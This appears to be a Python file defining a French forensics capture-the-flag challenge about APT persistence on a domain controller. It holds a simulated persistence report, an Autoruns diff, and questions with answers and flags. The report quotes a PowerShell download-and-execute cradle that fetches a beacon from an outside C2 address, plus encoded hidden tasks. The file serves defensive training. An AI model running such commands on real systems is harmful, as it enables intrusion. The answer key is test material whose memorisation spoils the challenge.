"""
Challenge 9 — Persistance APT Avancée
Niveau : 3 (Analyste Senior)
Catégorie : Forensics Système
"""

ARTIFACT_PERSISTENCE = r"""
=== RAPPORT D'ANALYSE FORENSIC — SRV-AD-01 ===
=== Date: 2026-02-18 — Analyste: [EN ATTENTE] ===
=== Outil: Autoruns v14.09 + PowerShell Get-ScheduledTask ===
=== Classification: CONFIDENTIEL — TLP:RED ===

[1] TACHES PLANIFIEES (schtasks /query /fo LIST /v) — 14 taches trouvees
------------------------------------------------------------------------

Nom de la tache:    \Microsoft\Windows\WindowsUpdate\AutoUpdate
Etat:               Pret
Declencheur:        Au demarrage du systeme
Action:             C:\Windows\System32\wuauclt.exe /detectnow
Compte d'execution: SYSTEM
Derniere execution: 18/02/2026 06:00:00
Signe:              Microsoft Windows (valide)
SHA256:             d1a2b3c4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5z6a7b8c9d0e1f2

Nom de la tache:    \Microsoft\Windows\Maintenance\WinSAT
Etat:               Pret
Declencheur:        Tous les jours a 03:00
Action:             C:\Windows\System32\WinSAT.exe formal
Compte d'execution: SYSTEM
Signe:              Microsoft Windows (valide)

Nom de la tache:    \Microsoft\Windows\Defrag\ScheduledDefrag
Etat:               Pret
Declencheur:        Tous les mercredis a 01:00
Action:             C:\Windows\System32\defrag.exe C: /O
Compte d'execution: SYSTEM
Signe:              Microsoft Windows (valide)

Nom de la tache:    \CrowdStrike\CSFalconUpdate
Etat:               Pret
Declencheur:        Toutes les 4 heures
Action:             "C:\Program Files\CrowdStrike\CSFalconService.exe" /update
Compte d'execution: SYSTEM
Signe:              CrowdStrike Inc. (valide)
Derniere execution: 18/02/2026 08:00:00

Nom de la tache:    \Veeam\VeeamBackupAgent
Etat:               Pret
Declencheur:        Tous les jours a 06:00
Action:             "C:\Program Files\Veeam\Agent\VeeamAgent.exe" /scheduled
Compte d'execution: SYSTEM
Signe:              Veeam Software Group GmbH (valide)
Derniere execution: 18/02/2026 06:00:14

Nom de la tache:    \Microsoft\Windows\NetTrace\GatherNetworkInfo
Etat:               Pret
Declencheur:        Toutes les 15 minutes
Action:             rundll32.exe C:\Windows\System32\wbem\ntevt.dll,DllRegisterServer
Compte d'execution: SYSTEM
Derniere execution: 18/02/2026 11:45:00
Creee:              12/02/2026 03:22:00  <-- NOTE: creee le lendemain de la compromission initiale
Signe:              NON SIGNE
SHA256:             e4a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1
VirusTotal:         0/72

Nom de la tache:    \Microsoft\Windows\SoftwareProtectionPlatform\SvcRestartTask
Etat:               Pret
Declencheur:        Evenement: Microsoft-Windows-Security-Licensing/Operational
Action:             sc start sppsvc
Compte d'execution: NETWORK SERVICE
Signe:              Microsoft Windows (valide)

Nom de la tache:    \Microsoft\Windows\Diagnosis\Scheduled
Etat:               Pret
Declencheur:        Tous les jours a 04:00
Action:             C:\Windows\System32\msdt.exe /run /id PerformanceDiagnostic
Compte d'execution: SYSTEM
Signe:              Microsoft Windows (valide)

Nom de la tache:    \MSSQL\SQLAgent_Maintenance
Etat:               Pret
Declencheur:        Tous les jours a 02:00
Action:             "C:\Program Files\Microsoft SQL Server\MSSQL15\MSSQL\Binn\SQLCMD.EXE" -S localhost -Q "EXEC sp_cycle_errorlog"
Compte d'execution: svc-sql (compte de service)
Signe:              Microsoft Corporation (valide)

Nom de la tache:    \Microsoft\Windows\CertificateServicesClient\UserTask
Etat:               Pret
Declencheur:        A la connexion de l'utilisateur
Action:             C:\Windows\System32\certutil.exe -pulse
Compte d'execution: Users
Signe:              Microsoft Windows (valide)

Nom de la tache:    \Nessus\NessusUpdate
Etat:               Pret
Declencheur:        Tous les jours a 05:30
Action:             "C:\Program Files\Tenable\Nessus\nessuscli.exe" update --all
Compte d'execution: SYSTEM
Signe:              Tenable Inc. (valide)
Derniere execution: 18/02/2026 05:30:22

Nom de la tache:    \Microsoft\Windows\SystemRestore\SR
Etat:               Desactive
Declencheur:        --
Action:             C:\Windows\System32\srtasks.exe ExecuteScopeRestorePoint /WaitForRestorePoint
Compte d'execution: SYSTEM
NOTE:               Desactive — restauration systeme non configuree sur les serveurs

Nom de la tache:    \GoogleChromeAutoUpdate
Etat:               Pret
Declencheur:        Toutes les 5 minutes
Action:             powershell.exe -ep bypass -w hidden -e SQBFAFgA...
Compte d'execution: j.martin
Creee:              11/02/2026 14:35:00  <-- NOTE: meme jour que la compromission initiale
NOTE:               Pas de dossier editeur Google installe sur ce serveur
NOTE:               La commande -e est encodee en Base64 (IEX download cradle)

Nom de la tache:    \ITMaintenance\DailyHealthCheck
Etat:               Pret
Declencheur:        Tous les jours a 07:30
Action:             "C:\Scripts\HealthCheck.ps1"
Compte d'execution: svc-monitoring
Signe:              N/A (script PowerShell)
Creee:              15/06/2025 — par admin.rsi (ancien)
Derniere execution: 18/02/2026 07:30:00
NOTE:               Script legitime de monitoring cree par l'equipe IT

[2] SERVICES WINDOWS (sc query + analyse) — 37 services analyses (resume)
--------------------------------------------------------------------------

=== Services legitimes (extraits pertinents) ===

Service: W32Time (Windows Time)
  Binpath:   C:\Windows\System32\svchost.exe -k LocalService
  Start:     AUTO_START
  Status:    RUNNING
  Account:   LocalService
  Signe:     Microsoft Windows (valide)

Service: CrowdStrike Falcon Sensor (CSFalconService)
  Binpath:   "C:\Program Files\CrowdStrike\CSFalconService.exe"
  Start:     AUTO_START
  Status:    RUNNING
  Account:   SYSTEM
  Signe:     CrowdStrike Inc. (valide)

Service: DNS Server (DNS)
  Binpath:   C:\Windows\System32\dns.exe
  Start:     AUTO_START
  Status:    RUNNING
  Account:   SYSTEM
  Signe:     Microsoft Windows (valide)
  NOTE:      Service normal pour un Domain Controller

Service: Active Directory Domain Services (NTDS)
  Binpath:   C:\Windows\System32\lsass.exe
  Start:     AUTO_START
  Status:    RUNNING
  Account:   SYSTEM

Service: Kerberos Key Distribution Center (Kdc)
  Binpath:   C:\Windows\System32\lsass.exe
  Start:     AUTO_START
  Status:    RUNNING
  Account:   SYSTEM

Service: Windows Remote Management (WinRM)
  Binpath:   C:\Windows\System32\svchost.exe -k NetworkService
  Start:     AUTO_START
  Status:    RUNNING
  Account:   NETWORK SERVICE
  NOTE:      Active pour la gestion a distance — legitime sur un DC

Service: MSSQLSERVER (SQL Server)
  Binpath:   "C:\Program Files\Microsoft SQL Server\MSSQL15\MSSQL\Binn\sqlservr.exe" -sMSSQLSERVER
  Start:     AUTO_START
  Status:    RUNNING
  Account:   svc-sql
  Signe:     Microsoft Corporation (valide)

Service: VeeamBackupSvc
  Binpath:   "C:\Program Files\Veeam\Agent\VeeamBackupSvc.exe"
  Start:     AUTO_START
  Status:    RUNNING
  Account:   SYSTEM
  Signe:     Veeam Software Group GmbH (valide)

Service: Spooler (Print Spooler)
  Binpath:   C:\Windows\System32\spoolsv.exe
  Start:     AUTO_START
  Status:    RUNNING
  Account:   SYSTEM
  NOTE:      Print Spooler active sur un DC — vecteur d'attaque PrintNightmare potentiel
  NOTE:      Pas de vulnerabilite exploitee ici, mais recommandation de desactivation

Service: SNMP (Simple Network Management Protocol)
  Binpath:   C:\Windows\System32\snmp.exe
  Start:     AUTO_START
  Status:    RUNNING
  Account:   SYSTEM
  Community: public (lecture seule)
  NOTE:      Community string par defaut — recommandation de changement

=== Services SUSPECTS ===

Service: WinDefenderUpdate
  Binpath:   C:\Windows\Temp\svc.exe
  Start:     AUTO_START
  Status:    RUNNING
  Account:   LocalSystem
  Signe:     NON SIGNE
  Cree:      12/02/2026 04:15:00 (jour apres compromission)
  -> Connexions sortantes vers 185.234.72.19:443 (toutes les 60 secondes)
  -> SHA256: f1e2d3c4b5a6978869504132a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9
  -> VirusTotal: 3/72 (Trojan.GenericKD, Backdoor.Win64, HEUR:Trojan.Win64.Agent)
  -> ANOMALIES: Binaire dans \Temp\, non signe, nom imitant Defender, connexion C2

Service: WMI Performance Adapter (WmiApSrv)
  Binpath:   C:\Windows\System32\wbem\WmiApSrv.exe
  Start:     MANUAL
  Status:    STOPPED
  Account:   LocalSystem
  Signe:     Microsoft Windows (valide)
  NOTE:      Service legitime Windows — actuellement arrete (normal)

Service: sshd (OpenSSH Server)
  Binpath:   C:\Windows\System32\OpenSSH\sshd.exe
  Start:     AUTO_START
  Status:    RUNNING
  Account:   SYSTEM
  Signe:     Microsoft Windows (valide)
  NOTE:      OpenSSH installe — legitime mais inhabituel sur un DC Windows
  NOTE:      Verifier si l'installation etait planifiee par l'IT

[3] CLES DE REGISTRE RUN — Analyse complete
--------------------------------------------

=== HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run ===

  SecurityHealth         = "C:\Windows\System32\SecurityHealthSystray.exe"
    -> Signe: Microsoft Windows (valide)
    -> LEGITIME — Windows Security Health

  VMware Tools           = "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"
    -> Signe: VMware Inc. (valide)
    -> LEGITIME — VMware Guest Agent

  CrowdStrike Sensor     = "C:\Program Files\CrowdStrike\CSFalconTray.exe"
    -> Signe: CrowdStrike Inc. (valide)
    -> LEGITIME — EDR tray icon

  WindowsOptimizer       = "C:\ProgramData\Microsoft\Crypto\RSA\updater.exe"
    -> Signe: Certificat auto-signe "Microsoft Windows" (INVALIDE — auto-signe!)
    -> SHA256: a9b8c7d6e5f4a3b2c1d0e9f8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0a9b8
    -> Cree: 13/02/2026 02:30:00 (pendant la phase de reconnaissance)
    -> Communications: DNS beaconing vers c2-update-service.xyz toutes les 30 secondes
    -> ANOMALIES: Chemin dans Crypto\RSA (dissimulation), certificat auto-signe imitant MS,
                  nom "WindowsOptimizer" n'est pas un composant Windows standard

=== HKCU\Software\Microsoft\Windows\CurrentVersion\Run (j.martin) ===

  GoogleChromeAutoUpdate = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Users\j.martin\AppData\Local\Temp\update_checker.ps1"
    -> Non signe (script PowerShell)
    -> ANOMALIE: Google Chrome n'est PAS installe sur SRV-AD-01
    -> Correspond a la tache planifiee malveillante du meme nom

  OneDrive               = "C:\Users\j.martin\AppData\Local\Microsoft\OneDrive\OneDrive.exe"
    -> Signe: Microsoft Corporation (valide)
    -> LEGITIME — OneDrive sync client

=== HKCU\Software\Microsoft\Windows\CurrentVersion\Run (admin.rsi) ===

  (vide — aucune entree)

=== HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon ===

  Userinit = "C:\Windows\System32\userinit.exe,"
    -> LEGITIME — Processus de logon standard

  Shell    = "explorer.exe"
    -> LEGITIME — Shell par defaut

=== HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce ===

  ** VIDE ** — Pas d'entrees
  NOTE: Verifier si des entrees ont ete supprimees apres execution

[4] WMI EVENT SUBSCRIPTIONS — Analyse complete
-----------------------------------------------

=== Subscription #1 ===
Name:       SCM Event Log Consumer
Type:       Permanent
Filter:     SELECT * FROM __InstanceModificationEvent WITHIN 60
            WHERE TargetInstance ISA 'Win32_PerfRawData_PerfOS_System'
Consumer:   CommandLineEventConsumer
Command:    powershell.exe -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://185.234.72.19:8080/beacon.ps1')"
Created:    14/02/2026 01:45:00 (T-4 jours)
ANALYSE:
  - Se declenche toutes les 60 secondes (WITHIN 60)
  - Telecharge et execute un beacon PowerShell depuis le C2
  - Utilise la classe Win32_PerfRawData comme pretexte
  - Tres difficile a detecter sans outils specialises
  -> MALVEILLANT — C2 beaconing via WMI persistence

=== Subscription #2 ===
Name:       BVTFilter
Type:       Permanent
Filter:     SELECT * FROM __InstanceModificationEvent WITHIN 600
            WHERE TargetInstance ISA 'Win32_Processor' AND TargetInstance.LoadPercentage > 99
Consumer:   NTEventLogEventConsumer
Command:    (log entry — Event ID 63)
ANALYSE:
  - Surveille la charge CPU > 99%
  - Ecrit une entree dans le journal d'evenements Windows
  - WMI subscription standard pour le monitoring
  -> LEGITIME — Monitoring performance CPU

=== Subscription #3 ===
Name:       Dell Command | Monitor
Type:       Permanent
Filter:     SELECT * FROM __InstanceCreationEvent WITHIN 300
            WHERE TargetInstance ISA 'Win32_NTLogEvent' AND TargetInstance.EventCode = 6008
Consumer:   NTEventLogEventConsumer
Command:    (log entry — Dell SupportAssist)
ANALYSE:
  - Surveille l'evenement 6008 (arret inattendu)
  - Ecrit un log Dell SupportAssist
  -> LEGITIME — Monitoring materiel Dell

[5] ANALYSE KERBEROS — Tickets en cache
-----------------------------------------

=== Tickets TGT en cache (klist) ===

Ticket #0:
  Client: j.martin@REDPAWN.LOCAL
  Server: krbtgt/REDPAWN.LOCAL@REDPAWN.LOCAL
  KerbTicket Encryption: AES-256-CTS-HMAC-SHA1-96
  Start Time: 18/02/2026 07:02:00
  End Time:   18/02/2026 17:02:00 (10h — duree normale)
  Renew Time: 25/02/2026 07:02:00
  -> LEGITIME — Session Kerberos normale

Ticket #1:
  Client: admin.rsi@REDPAWN.LOCAL
  Server: krbtgt/REDPAWN.LOCAL@REDPAWN.LOCAL
  KerbTicket Encryption: AES-256-CTS-HMAC-SHA1-96
  Start Time: 18/02/2026 07:30:00 (connexion VPN)
  End Time:   18/02/2026 17:30:00 (10h — duree normale)
  Renew Time: 25/02/2026 07:30:00
  -> LEGITIME — Session admin maintenance

Ticket #2:
  Client: Administrator@REDPAWN.LOCAL
  Server: krbtgt/REDPAWN.LOCAL@REDPAWN.LOCAL
  KerbTicket Encryption: RC4_HMAC_MD5
  Start Time: 18/02/2026 08:40:00
  End Time:   18/02/2036 08:40:00 (*** DUREE: 10 ANS ***)
  Renew Time: 18/02/2036 08:40:00
  ANOMALIES:
    - Duree de vie de 10 ANS (defaut = 10 heures) -> GOLDEN TICKET
    - Chiffrement RC4 (ancien) au lieu de AES-256 (defaut depuis 2012)
    - Cree EXACTEMENT avant l'extraction NTDS.dit (08:42)
    - Le hash KRBTGT a ete obtenu via le dump NTDS
    - Permet un acces ILLIMITE au domaine tant que le hash KRBTGT n'est pas change DEUX FOIS

Ticket #3:
  Client: svc-backup@REDPAWN.LOCAL
  Server: cifs/SRV-FILE-02.REDPAWN.LOCAL@REDPAWN.LOCAL
  KerbTicket Encryption: AES-256-CTS-HMAC-SHA1-96
  Start Time: 18/02/2026 06:00:00
  End Time:   18/02/2026 16:00:00 (10h — duree normale)
  -> LEGITIME — Service ticket pour acces backup

Ticket #4:
  Client: svc-sql@REDPAWN.LOCAL
  Server: MSSQLSvc/SRV-DB-01.REDPAWN.LOCAL:1433@REDPAWN.LOCAL
  KerbTicket Encryption: AES-256-CTS-HMAC-SHA1-96
  Start Time: 18/02/2026 02:00:00
  End Time:   18/02/2026 12:00:00
  -> LEGITIME — Service ticket SQL Server

[6] DLL SEARCH ORDER HIJACKING — Analyse des repertoires
----------------------------------------------------------

Fichiers DLL dans des emplacements non standard:

C:\Windows\System32\wbem\ntevt.dll
  -> SHA256: e4a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1
  -> Taille: 124,416 bytes
  -> Cree: 12/02/2026 03:20:00
  -> Modifie: 12/02/2026 03:20:00
  -> Signe: NON
  -> VirusTotal: 0/72 (aucune detection)
  -> NOTE: Le fichier ntevt.dll N'EXISTE PAS dans une installation Windows standard
  -> NOTE: Le repertoire wbem contient normalement des fichiers WMI (.mof, .mfl)
  -> EXECUTE PAR: Tache planifiee GatherNetworkInfo via rundll32.exe
  -> ANALYSE DYNAMIQUE: Cree un canal de communication reverse HTTPS vers 185.234.72.19:443
  -> TECHNIQUE: DLL side-loading via tache planifiee legitime detournee

C:\Windows\Temp\svc.exe
  -> SHA256: f1e2d3c4b5a6978869504132a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9
  -> Taille: 287,232 bytes
  -> Cree: 12/02/2026 04:15:00
  -> Signe: NON
  -> VirusTotal: 3/72
  -> EXECUTE PAR: Service WinDefenderUpdate

C:\ProgramData\Microsoft\Crypto\RSA\updater.exe
  -> SHA256: a9b8c7d6e5f4a3b2c1d0e9f8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0a9b8
  -> Taille: 198,656 bytes
  -> Cree: 13/02/2026 02:30:00
  -> Signe: Certificat auto-signe "Microsoft Windows" (FAUX — auto-signe)
  -> VirusTotal: 1/72 (Suspicious.Win64.Agent)
  -> EXECUTE PAR: Cle de registre Run\WindowsOptimizer
  -> Communications DNS: c2-update-service.xyz toutes les 30 secondes
"""

ARTIFACT_AUTORUNS_DIFF = r"""
=== AUTORUNS COMPARISON — Baseline vs Current ===
=== Tool: Autoruns v14.09 (SysInternals) ===
=== Baseline: 01/02/2026 (avant compromission) ===
=== Current:  18/02/2026 (post-incident) ===

STATUS  | TYPE           | ENTRY                              | PATH / COMMAND
--------+----------------+------------------------------------+--------------------------------------------------
[=]     | Logon          | SecurityHealth                     | C:\Windows\System32\SecurityHealthSystray.exe
[=]     | Logon          | VMware Tools                       | C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
[=]     | Logon          | CrowdStrike Sensor                 | C:\Program Files\CrowdStrike\CSFalconTray.exe
[+NEW]  | Logon          | WindowsOptimizer                   | C:\ProgramData\Microsoft\Crypto\RSA\updater.exe
[+NEW]  | Logon          | GoogleChromeAutoUpdate (HKCU)       | powershell.exe -WindowStyle Hidden ...
[=]     | Service        | CrowdStrike Falcon Sensor           | CSFalconService.exe
[=]     | Service        | DNS Server                          | dns.exe
[=]     | Service        | NTDS                                | lsass.exe
[=]     | Service        | Kdc                                 | lsass.exe
[=]     | Service        | VeeamBackupSvc                      | VeeamBackupSvc.exe
[=]     | Service        | MSSQLSERVER                         | sqlservr.exe
[=]     | Service        | WinRM                               | svchost.exe -k NetworkService
[=]     | Service        | Spooler                             | spoolsv.exe
[=]     | Service        | SNMP                                | snmp.exe
[=]     | Service        | sshd (OpenSSH)                      | sshd.exe
[+NEW]  | Service        | WinDefenderUpdate                   | C:\Windows\Temp\svc.exe
[=]     | Scheduled Task | AutoUpdate                          | wuauclt.exe /detectnow
[=]     | Scheduled Task | WinSAT                              | WinSAT.exe formal
[=]     | Scheduled Task | ScheduledDefrag                     | defrag.exe C: /O
[=]     | Scheduled Task | CSFalconUpdate                      | CSFalconService.exe /update
[=]     | Scheduled Task | VeeamBackupAgent                    | VeeamAgent.exe /scheduled
[=]     | Scheduled Task | SvcRestartTask                      | sc start sppsvc
[=]     | Scheduled Task | Scheduled (Diagnosis)               | msdt.exe
[=]     | Scheduled Task | SQLAgent_Maintenance                | SQLCMD.EXE
[=]     | Scheduled Task | UserTask (CertSvc)                  | certutil.exe -pulse
[=]     | Scheduled Task | NessusUpdate                        | nessuscli.exe update --all
[=]     | Scheduled Task | DailyHealthCheck                    | HealthCheck.ps1
[MODIF] | Scheduled Task | GatherNetworkInfo                   | rundll32.exe ntevt.dll,DllRegisterServer
          NOTE: Action MODIFIEE — l'original etait "C:\Windows\System32\netcfg.exe -d"
[+NEW]  | Scheduled Task | GoogleChromeAutoUpdate               | powershell.exe -ep bypass -w hidden -e ...
[=]     | WMI            | BVTFilter                            | NTEventLogEventConsumer (CPU monitoring)
[=]     | WMI            | Dell Command | Monitor               | NTEventLogEventConsumer (Event 6008)
[+NEW]  | WMI            | SCM Event Log Consumer               | CommandLineEventConsumer -> C2 beacon

RESUME:
  Elements inchanges:    [=]     24 entrees
  Elements ajoutes:      [+NEW]   5 entrees  <-- A INVESTIGUER
  Elements modifies:     [MODIF]  1 entree   <-- A INVESTIGUER
  Elements supprimes:             0 entrees
"""

CHALLENGE = {
    "id": "c09_apt_persistence",
    "title": "Les Sept Peches de Persistance",
    "category": "forensics",
    "level": 3,
    "points_total": 580,
    "estimated_time": "50-70 min",
    "story": """
## Briefing de Mission

**Date :** 18 fevrier 2026, 18h00
**Priorite :** CRITIQUE
**Source :** Forensic post-incident -- Analyse de persistance

---

Apres la gestion initiale du ransomware, l'equipe CERT doit s'assurer que l'attaquant n'a pas laisse d'autres mecanismes de persistance qui lui permettraient de revenir.

Un analyste forensic a collecte les artefacts de persistance du DC (SRV-AD-01) et a genere un rapport Autoruns comparant l'etat actuel a la baseline d'avant la compromission.

> *"On a eradique le ransomware mais je suis sur que l'attaquant a laisse des backdoors. L'equipe forensic a collecte les mecanismes de persistance du DC et fait un diff Autoruns. Le rapport est massif -- il y a du bruit partout. Trouve les vrais implants malveillants parmi toute la config legitime. Si on en rate un seul, on se fait re-compromettre dans la semaine."*

<details>
<summary>Indice d'approche (cliquez pour afficher)</summary>

Analysez chaque mecanisme de persistance et correlaz les dates de creation avec la timeline de l'incident. Comparez le rapport complet avec le diff Autoruns pour identifier rapidement les changements. Attention aux elements modifies (pas seulement les nouveaux).

</details>
    """,
    "artifacts": [
        {
            "name": "persistence_analysis.txt",
            "type": "forensic_report",
            "content": ARTIFACT_PERSISTENCE,
            "description": "Rapport forensic complet des mecanismes de persistance sur SRV-AD-01"
        },
        {
            "name": "autoruns_diff.txt",
            "type": "comparison",
            "content": ARTIFACT_AUTORUNS_DIFF,
            "description": "Comparaison Autoruns: baseline (01/02/2026) vs etat actuel (18/02/2026)"
        }
    ],
    "questions": [
        {
            "id": "q1",
            "text": "Combien d'entrees [+NEW] et [MODIF] le diff Autoruns montre-t-il au total ?",
            "answer": "6",
            "flag": "REDPAWN{6}",
            "points": 30,
            "hints": [
                "Comptez les lignes [+NEW] et [MODIF] dans le diff Autoruns",
                "5 NEW + 1 MODIF = ?"
            ],
            "hint_cost": 10
        },
        {
            "id": "q2",
            "text": "Quelle DLL suspecte est chargee par la tache GatherNetworkInfo modifiee ?",
            "answer": "ntevt.dll",
            "flag": "REDPAWN{ntevt.dll}",
            "points": 50,
            "hints": [
                "Cherchez la tache planifiee marquee [MODIF] dans le diff Autoruns",
                "La DLL n'existe pas dans une installation Windows standard"
            ],
            "hint_cost": 17
        },
        {
            "id": "q3",
            "text": "Quelle etait l'action ORIGINALE de la tache GatherNetworkInfo avant modification ?",
            "answer": "netcfg.exe -d",
            "flag": "REDPAWN{netcfg.exe}",
            "points": 50,
            "hints": [
                "Regardez la NOTE sous l'entree [MODIF] dans le diff Autoruns",
                "L'original utilisait netcfg.exe, pas rundll32.exe"
            ],
            "hint_cost": 17
        },
        {
            "id": "q4",
            "text": "La DLL ntevt.dll a 0/72 detections VirusTotal. Que revele l'analyse dynamique sur son comportement ?",
            "answer": "reverse HTTPS vers 185.234.72.19:443",
            "flag": "REDPAWN{reverse_https}",
            "points": 50,
            "hints": [
                "Regardez la section [6] DLL Analysis du rapport",
                "Elle cree un canal de communication vers le C2"
            ],
            "hint_cost": 17
        },
        {
            "id": "q5",
            "text": "Quel service malveillant se fait passer pour Windows Defender ?",
            "answer": "WinDefenderUpdate",
            "flag": "REDPAWN{WinDefenderUpdate}",
            "points": 40,
            "hints": [
                "Cherchez les services [+NEW] dans le diff et l'analyse detaillee",
                "Le binaire est dans C:\\Windows\\Temp\\"
            ],
            "hint_cost": 13
        },
        {
            "id": "q6",
            "text": "Le fichier updater.exe utilise un certificat falsifie. Quel type de certificat est-ce ?",
            "answer": "auto-signe",
            "flag": "REDPAWN{auto-signe}",
            "points": 40,
            "hints": [
                "Regardez la section registre pour WindowsOptimizer",
                "Le certificat pretend etre Microsoft mais n'est pas emis par une CA"
            ],
            "hint_cost": 13
        },
        {
            "id": "q7",
            "text": "A quelle frequence (en secondes) le beaconing DNS de updater.exe communique-t-il avec le C2 ?",
            "answer": "30",
            "flag": "REDPAWN{30}",
            "points": 30,
            "hints": [
                "Cherchez les communications de updater.exe dans la section registre ou DLL analysis"
            ],
            "hint_cost": 10
        },
        {
            "id": "q8",
            "text": "Quelle technique de persistance WMI malveillante est utilisee ? (type de consumer)",
            "answer": "CommandLineEventConsumer",
            "flag": "REDPAWN{CommandLineEventConsumer}",
            "points": 50,
            "hints": [
                "Regardez la section WMI Subscriptions",
                "Il y a 3 subscriptions — une seule est malveillante"
            ],
            "hint_cost": 17
        },
        {
            "id": "q9",
            "text": "Le Golden Ticket utilise le chiffrement RC4 au lieu de quel algorithme attendu ?",
            "answer": "AES-256-CTS-HMAC-SHA1-96",
            "flag": "REDPAWN{AES-256}",
            "points": 50,
            "hints": [
                "Comparez le chiffrement du Ticket #2 avec les tickets legitimes (#0, #1)",
                "Les tickets normaux utilisent tous le meme algorithme AES"
            ],
            "hint_cost": 17
        },
        {
            "id": "q10",
            "text": "Combien de fois le hash KRBTGT doit-il etre change pour invalider le Golden Ticket ?",
            "answer": "2",
            "flag": "REDPAWN{2}",
            "points": 40,
            "hints": [
                "C'est mentionne dans les anomalies du Ticket #2",
                "Le KRBTGT garde en memoire le hash actuel ET le precedent"
            ],
            "hint_cost": 13
        },
        {
            "id": "q11",
            "text": "Le Print Spooler est active sur le DC. Quelle vulnerabilite connue cela expose-t-il potentiellement ?",
            "answer": "PrintNightmare",
            "flag": "REDPAWN{PrintNightmare}",
            "points": 40,
            "hints": [
                "Regardez la NOTE du service Spooler",
                "C'est une vulnerabilite celebre de 2021 (CVE-2021-34527)"
            ],
            "hint_cost": 13
        },
        {
            "id": "q12",
            "text": "Parmi les 3 binaires malveillants (ntevt.dll, svc.exe, updater.exe), lequel a la plus haute detection VirusTotal ?",
            "answer": "svc.exe",
            "flag": "REDPAWN{svc.exe}",
            "points": 30,
            "hints": [
                "Comparez les scores VT: ntevt.dll=0/72, svc.exe=3/72, updater.exe=1/72"
            ],
            "hint_cost": 10
        },
        {
            "id": "q13",
            "text": "A quelle date la tache GatherNetworkInfo a-t-elle ete modifiee ? (format: JJ/MM/AAAA)",
            "answer": "12/02/2026",
            "flag": "REDPAWN{12/02/2026}",
            "points": 40,
            "hints": [
                "Regardez la date de creation de la tache et de la DLL ntevt.dll",
                "La DLL a ete deployee le lendemain de la compromission initiale"
            ],
            "hint_cost": 13
        }
    ]
}
